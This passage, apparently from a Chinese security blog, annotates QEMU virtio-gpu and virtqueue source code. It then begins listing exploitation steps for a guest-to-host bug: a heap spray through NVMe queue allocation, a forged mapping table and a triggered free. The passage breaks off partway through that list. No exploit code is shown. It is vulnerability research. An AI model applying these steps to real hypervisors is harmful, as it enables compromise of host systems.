+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_handle_ctrl</span><span class="hljs-params">(VirtIODevice *vdev, VirtQueue *vq)</span><br>&#123;<br>	………………<br>    ………………<br>    cmd = virtqueue_pop(vq, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command));<br>    <span class="hljs-keyword">while</span> (cmd) &#123;<br>        cmd-&gt;vq = vq;<br>        cmd-&gt;error = <span class="hljs-number">0</span>;<br>        cmd-&gt;finished = <span class="hljs-literal">false</span>;<br>        QTAILQ_INSERT_TAIL(&amp;g-&gt;cmdq, cmd, next);<br>        cmd = virtqueue_pop(vq, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command));<br>    &#125;<br><br>    virtio_gpu_process_cmdq(g);<br>	………………<br>    ………………<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">virtqueue_pop</span><span class="hljs-params">(VirtQueue *vq, <span class="hljs-type">size_t</span> sz)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (unlikely(vq-&gt;vdev-&gt;broken)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (virtio_vdev_has_feature(vq-&gt;vdev, VIRTIO_F_RING_PACKED)) &#123;<br>        <span class="hljs-keyword">return</span> virtqueue_packed_pop(vq, sz);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> virtqueue_split_pop(vq, sz);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>virtqueue_split_pop函数就是设置Mapping Table中数据的关键函数，主要将vq-&gt;vring-&gt;desc虚拟机物理地址中的VirtIODevice结构体经过一些判断处理后赋值给elem，具体看源码和注释：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">virtqueue_split_pop</span><span class="hljs-params">(VirtQueue *vq, <span class="hljs-type">size_t</span> sz)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, head, max;<br>    VRingMemoryRegionCaches *caches;<br>    MemoryRegionCache indirect_desc_cache = MEMORY_REGION_CACHE_INVALID;<br>    MemoryRegionCache *desc_cache;<br>    <span class="hljs-type">int64_t</span> len;<br>    VirtIODevice *vdev = vq-&gt;vdev;<br>    VirtQueueElement *elem = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">unsigned</span> out_num, in_num, elem_entries;<br>    hwaddr addr[VIRTQUEUE_MAX_SIZE];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>[<span class="hljs-title">VIRTQUEUE_MAX_SIZE</span>];</span><br>    VRingDesc desc;<br>    <span class="hljs-type">int</span> rc;<br><br>    RCU_READ_LOCK_GUARD();<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    virtio_queue_empty_rcu函数判断队列是否为空， 函数具体判断vq-&gt;shadow_avail_idx和vq-&gt;last_avail_idx是否相等，</span><br><span class="hljs-comment">    不相等返回0；如果相等，继续使用vring_avail_idx函数更新shadow_avail_idx的值，不相等返回0，相等返回1。</span><br><span class="hljs-comment">    shadow_avail_idx的值是从(vq-&gt;vring-&gt;avail + offsetof(VRingAvail, idx))虚拟机物理地址中获取。</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> (virtio_queue_empty_rcu(vq)) &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br>    <span class="hljs-comment">/* Needed after virtio_queue_empty(), see comment in</span><br><span class="hljs-comment">     * virtqueue_num_heads(). */</span><br>    smp_rmb();<br><br>    <span class="hljs-comment">/* When we start there are none of either input nor output. */</span><br>    out_num = in_num = elem_entries = <span class="hljs-number">0</span>;<br><br>    max = vq-&gt;vring.num;<br>	<br>    <span class="hljs-keyword">if</span> (vq-&gt;inuse &gt;= vq-&gt;vring.num) &#123;<br>        virtio_error(vdev, <span class="hljs-string">&quot;Virtqueue size exceeded&quot;</span>);<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	virtqueue_get_head函数获取队列的头部引索值，head的值从(vq-&gt;vring-&gt;avail + offsetof(VRingAvail, ring[vq-&gt;last_avail_idx]))</span><br><span class="hljs-comment">	虚拟机物理地址中获取</span><br><span class="hljs-comment">	*/</span><br>    <span class="hljs-keyword">if</span> (!virtqueue_get_head(vq, vq-&gt;last_avail_idx++, &amp;head)) &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (virtio_vdev_has_feature(vdev, VIRTIO_RING_F_EVENT_IDX)) &#123;<br>        vring_set_avail_event(vq, vq-&gt;last_avail_idx);<br>    &#125;<br>	<span class="hljs-comment">//更新i</span><br>    i = head;<br>	<span class="hljs-comment">//获取caches信息</span><br>    caches = vring_get_region_caches(vq);<br>    <span class="hljs-keyword">if</span> (!caches) &#123;<br>        virtio_error(vdev, <span class="hljs-string">&quot;Region caches not initialized&quot;</span>);<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (caches-&gt;desc.len &lt; max * <span class="hljs-keyword">sizeof</span>(VRingDesc)) &#123;<br>        virtio_error(vdev, <span class="hljs-string">&quot;Cannot map descriptor ring&quot;</span>);<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br><br>    desc_cache = &amp;caches-&gt;desc;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    vring_split_desc_read函数将(vq-&gt;vring-&gt;desc +  i * sizeof(VRingDesc))虚拟机物理地址中</span><br><span class="hljs-comment">    的VRingDesc结构体赋值给desc</span><br><span class="hljs-comment">    */</span><br>    vring_split_desc_read(vdev, &amp;desc, desc_cache, i);<br>    <span class="hljs-keyword">if</span> (desc.flags &amp; VRING_DESC_F_INDIRECT) &#123;<br>        <span class="hljs-keyword">if</span> (!desc.len || (desc.len % <span class="hljs-keyword">sizeof</span>(VRingDesc))) &#123;<br>            virtio_error(vdev, <span class="hljs-string">&quot;Invalid size for indirect buffer table&quot;</span>);<br>            <span class="hljs-keyword">goto</span> done;<br>        &#125;<br><br>        <span class="hljs-comment">/* loop over the indirect descriptor table */</span><br>        len = address_space_cache_init(&amp;indirect_desc_cache, vdev-&gt;dma_as,<br>                                       desc.addr, desc.len, <span class="hljs-literal">false</span>);<br>        desc_cache = &amp;indirect_desc_cache;<br>        <span class="hljs-keyword">if</span> (len &lt; desc.len) &#123;<br>            virtio_error(vdev, <span class="hljs-string">&quot;Cannot map indirect buffer&quot;</span>);<br>            <span class="hljs-keyword">goto</span> done;<br>        &#125;<br><br>        max = desc.len / <span class="hljs-keyword">sizeof</span>(VRingDesc);<br>        i = <span class="hljs-number">0</span>;<br>        vring_split_desc_read(vdev, &amp;desc, desc_cache, i);<br>    &#125;<br><br>    <span class="hljs-comment">/* Collect all the descriptors */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-type">bool</span> map_ok;<br><br>        <span class="hljs-keyword">if</span> (desc.flags &amp; VRING_DESC_F_WRITE) &#123;<br>            map_ok = virtqueue_map_desc(vdev, &amp;in_num, addr + out_num,<br>                                        iov + out_num,<br>                                        VIRTQUEUE_MAX_SIZE - out_num, <span class="hljs-literal">true</span>,<br>                                        desc.addr, desc.len);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (in_num) &#123;<br>                virtio_error(vdev, <span class="hljs-string">&quot;Incorrect order for descriptors&quot;</span>);<br>                <span class="hljs-keyword">goto</span> err_undo_map;<br>            &#125;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            virtqueue_map_desc函数的效果如下:</span><br><span class="hljs-comment">            iov[out_num].iov_base = dma_memory_map函数映射desc.addr地址后的值</span><br><span class="hljs-comment">            iov[out_num].iov_len = desc.len</span><br><span class="hljs-comment">            out_num ++</span><br><span class="hljs-comment">            */</span><br>            map_ok = virtqueue_map_desc(vdev, &amp;out_num, addr, iov,<br>                                        VIRTQUEUE_MAX_SIZE, <span class="hljs-literal">false</span>,<br>                                        desc.addr, desc.len);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!map_ok) &#123;<br>            <span class="hljs-keyword">goto</span> err_undo_map;<br>        &#125;<br><br>        <span class="hljs-comment">/* If we&#x27;ve got too many, that implies a descriptor loop. */</span><br>        <span class="hljs-keyword">if</span> (++elem_entries &gt; max) &#123;<br>            virtio_error(vdev, <span class="hljs-string">&quot;Looped descriptor&quot;</span>);<br>            <span class="hljs-keyword">goto</span> err_undo_map;<br>        &#125;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		virtqueue_split_read_next_desc函数的作用为：判断desc.flag标志，i = desc-&gt;next，</span><br><span class="hljs-comment">		使用vring_split_desc_read获取下一个VRingDesc结构体</span><br><span class="hljs-comment">		*/</span><br>        rc = virtqueue_split_read_next_desc(vdev, &amp;desc, desc_cache, max, &amp;i);<br>    &#125; <span class="hljs-keyword">while</span> (rc == VIRTQUEUE_READ_DESC_MORE);<br><br>    <span class="hljs-keyword">if</span> (rc == VIRTQUEUE_READ_DESC_ERROR) &#123;<br>        <span class="hljs-keyword">goto</span> err_undo_map;<br>    &#125;<br><br>    <span class="hljs-comment">/* Now copy what we have collected and mapped */</span><br>    elem = virtqueue_alloc_element(sz, out_num, in_num);<br>    elem-&gt;index = head;<br>    elem-&gt;ndescs = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; out_num; i++) &#123;<br>        elem-&gt;out_addr[i] = addr[i];<br>        elem-&gt;out_sg[i] = iov[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; in_num; i++) &#123;<br>        elem-&gt;in_addr[i] = addr[out_num + i];<br>        elem-&gt;in_sg[i] = iov[out_num + i];<br>    &#125;<br><br>    vq-&gt;inuse++;<br><br>    trace_virtqueue_pop(vq, elem, elem-&gt;in_num, elem-&gt;out_num);<br>done:<br>    address_space_cache_destroy(&amp;indirect_desc_cache);<br><br>    <span class="hljs-keyword">return</span> elem;<br><br>err_undo_map:<br>    virtqueue_undo_map_desc(out_num, in_num, iov);<br>    <span class="hljs-keyword">goto</span> done;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>​                                          </p>
+<p>取得cmd后进入virtio_gpu_simple_process_cmd，首先就是调用VIRTIO_GPU_FILL_CMD，这个宏实际上就是将上面virtqueue_split_pop函数中第一个VirtIODevice结构体的addr中的值拷贝到cmd-&gt;cmd_hdr，然后通过switch进入相应的功能</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_GPU_FILL_CMD(out) do &#123;                                   \</span><br><span class="hljs-meta">        size_t s;                                                       \</span><br><span class="hljs-meta">        s = iov_to_buf(cmd-&gt;elem.out_sg, cmd-&gt;elem.out_num, 0,          \</span><br><span class="hljs-meta">                       &amp;out, sizeof(out));                              \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (s != sizeof(out)) &#123;                                         \</span><br><span class="hljs-meta">            qemu_log_mask(LOG_GUEST_ERROR,                              \</span><br><span class="hljs-meta">                          <span class="hljs-string">&quot;%s: command size incorrect %zu vs %zu\n&quot;</span>,    \</span><br><span class="hljs-meta">                          __func__, s, sizeof(out));                    \</span><br><span class="hljs-meta">            return;                                                     \</span><br><span class="hljs-meta">        &#125;                                                               \</span><br><span class="hljs-meta">    &#125; while (0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_simple_process_cmd</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                          <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd)</span><br>&#123;<br>    VIRTIO_GPU_FILL_CMD(cmd-&gt;cmd_hdr);<br>    virtio_gpu_ctrl_hdr_bswap(&amp;cmd-&gt;cmd_hdr);<br><br>    <span class="hljs-keyword">switch</span> (cmd-&gt;cmd_hdr.type) &#123;<br><br>	………………<br>    ………………<br><br>    <span class="hljs-keyword">case</span> VIRTIO_GPU_CMD_RESOURCE_ATTACH_BACKING:<br>        virtio_gpu_resource_attach_backing(g, cmd);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING:<br>        virtio_gpu_resource_detach_backing(g, cmd);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_UNSPEC;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!cmd-&gt;finished) &#123;<br>        virtio_gpu_ctrl_response_nodata(g, cmd, cmd-&gt;error ? cmd-&gt;error :<br>                                        VIRTIO_GPU_RESP_OK_NODATA);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>virtio_gpu_resource_attach_backing函数中要顺利调用virtio_gpu_create_mapping_iov，还要<code>virtio_gpu_find_resource(g, ab.resource_id)</code>返回的virtio_gpu_simple_resource结构体满足一些条件，所以事先调用virtio_gpu_resource_create_2d函数创建一个virtio_gpu_simple_resource结构体，通过ab.resource_id找到相应的virtio_gpu_simple_resource结构体，之后就能进入virtio_gpu_create_mapping_iov函数了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">virtio_gpu_resource_attach_backing</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                   <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_simple_resource</span> *<span class="hljs-title">res</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> <span class="hljs-title">ab</span>;</span><br>    <span class="hljs-type">int</span> ret;<br><br>    VIRTIO_GPU_FILL_CMD(ab);<br>    virtio_gpu_bswap_32(&amp;ab, <span class="hljs-keyword">sizeof</span>(ab));<br>    trace_virtio_gpu_cmd_res_back_attach(ab.resource_id);<br><br>    res = virtio_gpu_find_resource(g, ab.resource_id);<br>    <span class="hljs-keyword">if</span> (!res) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: illegal resource specified %d\n&quot;</span>,<br>                      __func__, ab.resource_id);<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_INVALID_RESOURCE_ID;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (res-&gt;iov) &#123;<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_UNSPEC;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ret = virtio_gpu_create_mapping_iov(g, &amp;ab, cmd, &amp;res-&gt;addrs, &amp;res-&gt;iov);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_UNSPEC;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    res-&gt;iov_cnt = ab.nr_entries;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_resource_create_2d</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                          <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd)</span><br>&#123;<br>	………………<br>    ………………<br>    <br>    <span class="hljs-keyword">if</span> (c2d.resource_id == <span class="hljs-number">0</span>) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: resource id 0 is not allowed\n&quot;</span>,<br>                      __func__);<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_INVALID_RESOURCE_ID;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    res = virtio_gpu_find_resource(g, c2d.resource_id);<br>    <span class="hljs-keyword">if</span> (res) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: resource already exists %d\n&quot;</span>,<br>                      __func__, c2d.resource_id);<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_INVALID_RESOURCE_ID;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    res = g_new0(<span class="hljs-keyword">struct</span> virtio_gpu_simple_resource, <span class="hljs-number">1</span>);<br><br>    res-&gt;width = c2d.width;<br>    res-&gt;height = c2d.height;<br>    res-&gt;format = c2d.format;<br>    res-&gt;resource_id = c2d.resource_id;<br><br>	………………<br>    ………………<br><br>    QTAILQ_INSERT_HEAD(&amp;g-&gt;reslist, res, next);<br>    g-&gt;hostmem += res-&gt;hostmem;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>进入virtio_gpu_create_mapping_iov函数后就可以完成mapping table的设置</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">virtio_gpu_create_mapping_iov</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                  <span class="hljs-keyword">struct</span> virtio_gpu_resource_attach_backing *ab,</span><br><span class="hljs-params">                                  <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd,</span><br><span class="hljs-params">                                  <span class="hljs-type">uint64_t</span> **addr, <span class="hljs-keyword">struct</span> iovec **iov)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> *<span class="hljs-title">ents</span>;</span><br>    <span class="hljs-type">size_t</span> esize, s;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (ab-&gt;nr_entries &gt; <span class="hljs-number">16384</span>) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR,<br>                      <span class="hljs-string">&quot;%s: nr_entries is too big (%d &gt; 16384)\n&quot;</span>,<br>                      __func__, ab-&gt;nr_entries);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    esize = <span class="hljs-keyword">sizeof</span>(*ents) * ab-&gt;nr_entries;<br>    ents = g_malloc(esize);<br>    s = iov_to_buf(cmd-&gt;elem.out_sg, cmd-&gt;elem.out_num,<br>                   <span class="hljs-keyword">sizeof</span>(*ab), ents, esize);<br>    <span class="hljs-keyword">if</span> (s != esize) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR,<br>                      <span class="hljs-string">&quot;%s: command data size incorrect %zu vs %zu\n&quot;</span>,<br>                      __func__, s, esize);<br>        g_free(ents);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    *iov = g_malloc0(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> iovec) * ab-&gt;nr_entries);<br>    <span class="hljs-keyword">if</span> (addr) &#123;<br>        *addr = g_malloc0(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) * ab-&gt;nr_entries);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ab-&gt;nr_entries; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> a = le64_to_cpu(ents[i].addr);<br>        <span class="hljs-type">uint32_t</span> l = le32_to_cpu(ents[i].length);<br>        hwaddr len = l;<br>        (*iov)[i].iov_len = l;<br>        (*iov)[i].iov_base = dma_memory_map(VIRTIO_DEVICE(g)-&gt;dma_as,<br>                                            a, &amp;len, DMA_DIRECTION_TO_DEVICE);<br>        <span class="hljs-keyword">if</span> (addr) &#123;<br>            (*addr)[i] = a;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!(*iov)[i].iov_base || len != l) &#123;<br>            qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: failed to map MMIO memory for&quot;</span><br>                          <span class="hljs-string">&quot; resource %d element %d\n&quot;</span>,<br>                          __func__, ab-&gt;resource_id, i);<br>            virtio_gpu_cleanup_mapping_iov(g, *iov, i);<br>            g_free(ents);<br>            *iov = <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">if</span> (addr) &#123;<br>                g_free(*addr);<br>                *addr = <span class="hljs-literal">NULL</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    g_free(ents);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="具体利用流程"><a href="#具体利用流程" class="headerlink" title="具体利用流程"></a>具体利用流程</h2><ol>
+<li>利用nvme_create_cq或者nvme_create_sq中的malloc原语来实现堆喷，获得稳定堆空间的布局。</li>
+<li>构造mapping table，设置好qsg-&gt;sg的值是dma_memory_map后的地址，在后面释放这个地址时在qemu_sglist_destroy函数中有<code>object_unref(OBJECT(qsg-&gt;dev))</code>，需要通过这个函数里的判断，所以还需要设置qsg-&gt;dev的值是0。</li>
+<li>构造完以后还需要释放，这里直接让dma_memory_map中的<code>len</code> 为0，函数的返回值就是0， 通过 <code>if (!(*iov)[i].iov_base || len != l)</code>这个判断后直接调用virtio_gpu_cleanup_mapping_iov函数释放。</li>
